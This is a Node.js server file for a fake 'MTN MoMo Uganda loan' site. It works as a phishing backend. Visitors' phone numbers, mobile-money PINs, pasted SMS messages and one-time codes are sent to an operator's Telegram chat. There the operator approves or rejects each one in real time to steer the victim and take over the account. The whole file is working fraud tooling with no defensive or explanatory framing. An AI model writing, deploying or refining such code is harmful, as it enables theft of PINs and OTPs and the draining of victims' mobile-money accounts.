// server.js — MTN MoMo Uganda loan funnel + Telegram approval bot
const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN     = process.env.BOT_TOKEN;      // from @BotFather
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;  // your Telegram chat id
const BASE_URL      = process.env.BASE_URL;       // https://your-app.onrender.com
const PORT          = process.env.PORT || 3000;

const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;
const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

async function tg(method, payload) {
  try {
    const r = await fetch(`${TG}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    return await r.json();
  } catch (e) { console.error(method, e.message); }
}

const apps  = new Map();
const newId = () => 'APP' + crypto.randomBytes(4).toString('hex').toUpperCase();

// ---------- 1. LOGIN (phone + PIN) ----------
app.post('/api/verify-pin', async (req, res) => {
  const { phoneNumber, pin } = req.body || {};
  if (!phoneNumber || !pin) return res.json({ success: false, message: 'Missing phone or PIN.' });

  const id = newId();
  apps.set(id, { id, phoneNumber, pin, smsMessage: null, otp: null,
                 pinStatus: 'pending', otpStatus: 'pending' });

  await tg('sendMessage', {
    chat_id: ADMIN_CHAT_ID, parse_mode: 'HTML',
    text: `🔐 <b>NEW LOGIN REQUEST</b>\n🆔 <code>${id}</code>\n📱 <b>+256${esc(phoneNumber)}</b>\n🔑 PIN: <b>${esc(pin)}</b>`,
    reply_markup: { inline_keyboard: [[
      { text: '✅ APPROVE PIN', callback_data: `pin:${id}:a` },
      { text: '❌ WRONG PIN',   callback_data: `pin:${id}:r` }
    ]]}
  });

  res.json({ success: true, applicationId: id });
});

app.get('/api/check-pin-status/:id', (req, res) => {
  const r = apps.get(req.params.id);
  if (!r) return res.json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: r.pinStatus });
});

// ---------- 2. PASTED SMS ----------
app.post('/api/verify-sms', async (req, res) => {
  const { applicationId, smsMessage } = req.body || {};
  const r = apps.get(applicationId);
  if (!r) return res.json({ success: false, message: 'Application not found' });

  r.smsMessage = smsMessage;
  r.otpStatus  = 'pending';

  await tg('sendMessage', {
    chat_id: ADMIN_CHAT_ID, parse_mode: 'HTML',
    text: `💬 <b>PASTED SMS</b>\n🆔 <code>${applicationId}</code>\n📱 +256${esc(r.phoneNumber)}\n\n<pre>${esc(smsMessage)}</pre>`,
    reply_markup: { inline_keyboard: [[
      { text: '✅ APPROVE SMS', callback_data: `sms:${applicationId}:a` },
      { text: '❌ WRONG SMS',   callback_data: `sms:${applicationId}:r` }
    ]]}
  });

  res.json({ success: true });
});

app.post('/api/resend-sms', (req, res) => {
  const r = apps.get(req.body?.applicationId);
  if (!r) return res.json({ success: false, message: 'Application not found' });
  res.json({ success: true });
});

app.get('/api/check-otp-status/:id', (req, res) => {
  const r = apps.get(req.params.id);
  if (!r) return res.json({ success: false, message: 'Application not found' });
  res.json({ success: true, status: r.otpStatus });
});

// ---------- 3. PASTED OTP ----------
app.post('/api/verify-otp', async (req, res) => {
  const { applicationId, otp } = req.body || {};
  const r = apps.get(applicationId);
  if (!r) return res.json({ success: false, message: 'Application not found' });

  r.otp       = otp;
  r.otpStatus = 'pending';

  await tg('sendMessage', {
    chat_id: ADMIN_CHAT_ID, parse_mode: 'HTML',
    text: `🔢 <b>PASTED OTP</b>\n🆔 <code>${applicationId}</code>\n📱 +256${esc(r.phoneNumber)}\n\n<pre>${esc(otp)}</pre>`,
    reply_markup: { inline_keyboard: [[
      { text: '✅ APPROVE OTP', callback_data: `otp:${applicationId}:a` },
      { text: '❌ WRONG CODE',  callback_data: `otp:${applicationId}:r` },
      { text: '⚠️ WRONG PIN',  callback_data: `otp:${applicationId}:p` }
    ]]}
  });

  res.json({ success: true });
});

// ---------- TELEGRAM WEBHOOK ----------
app.post('/telegram-webhook', async (req, res) => {
  res.sendStatus(200);
  const u = req.body;

  if (u.message?.text?.trim() === '/start') {
    return tg('sendMessage', {
      chat_id: u.message.chat.id, parse_mode: 'HTML',
      text: `👋 <b>Bot online.</b>\nYour chat ID is <code>${u.message.chat.id}</code>`
    });
  }

  const q = u.callback_query;
  if (!q) return;

  const [stage, id, act] = (q.data || '').split(':');
  const r = apps.get(id);
  if (!r) return tg('answerCallbackQuery', { callback_query_id: q.id, text: 'Application not found' });

  let label = '';
  if (stage === 'pin') {
    r.pinStatus = act === 'a' ? 'approved' : 'rejected';
    label = act === 'a' ? '✅ PIN approved' : '❌ PIN rejected';
  } else if (stage === 'sms') {
    r.otpStatus = act === 'a' ? 'approved' : 'rejected';
    label = act === 'a' ? '✅ SMS approved' : '❌ SMS rejected';
  } else if (stage === 'otp') {
    r.otpStatus = act === 'a' ? 'approved' : act === 'p' ? 'wrongpin_otp' : 'wrongcode';
    label = act === 'a' ? '✅ OTP approved' : act === 'p' ? '⚠️ Wrong PIN' : '❌ Wrong OTP code';
  }

  await tg('answerCallbackQuery', { callback_query_id: q.id, text: label });
  await tg('editMessageReplyMarkup', {
    chat_id: q.message.chat.id, message_id: q.message.message_id,
    reply_markup: { inline_keyboard: [] }
  });
  await tg('sendMessage', {
    chat_id: q.message.chat.id, parse_mode: 'HTML',
    text: `${label} — <code>${id}</code>`
  });
});

app.get('/health', (_req, res) => res.json({ status: 'ok', bot: 'webhook' }));

// register webhook on boot
if (BASE_URL && BOT_TOKEN) {
  fetch(`${TG}/setWebhook?url=${encodeURIComponent(BASE_URL + '/telegram-webhook')}`)
    .then(r => r.json()).then(j => console.log('setWebhook:', j))
    .catch(e => console.error('setWebhook failed:', e.message));
}

app.listen(PORT, () => console.log('Listening on', PORT));